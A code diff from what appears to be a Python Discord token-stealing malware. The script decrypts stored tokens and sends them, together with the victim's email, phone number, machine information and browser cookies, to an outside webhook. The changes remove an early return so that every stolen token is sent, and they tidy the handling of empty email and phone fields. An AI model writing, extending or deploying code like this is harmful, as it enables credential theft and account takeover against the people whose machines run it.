@@ -335,7 +335,6 @@ def find_token():
                             if decrypted_token and decrypted_token not in sent_tokens:
                                 sent_tokens.add(decrypted_token)
                                 webhook(decrypted_token)
-                                return  
                         except Exception as e:
                             print(f"Decryption failed")
         except PermissionError:
@@ -375,7 +374,7 @@ def webhook(token):
                     },
                     {
                         "name": "📫️ Email",
-                        "value": f"```{email}```",
+                        "value": f"```{email if email else ''}```",
                         "inline": False
                     },
                     {
@@ -385,7 +384,7 @@ def webhook(token):
                     },
                     {
                         "name": ":mobile_phone: Phone",
-                        "value": f"{phone}",
+                        "value": f"{phone if phone else 'N/A'}",
                         "inline": True
                     },
                     {
@@ -411,6 +410,7 @@ def webhook(token):
         print(f"                            ")
 def main():
     checker()
+    
     find_token()
     machineinfo()
     extract_cookies(h00k)
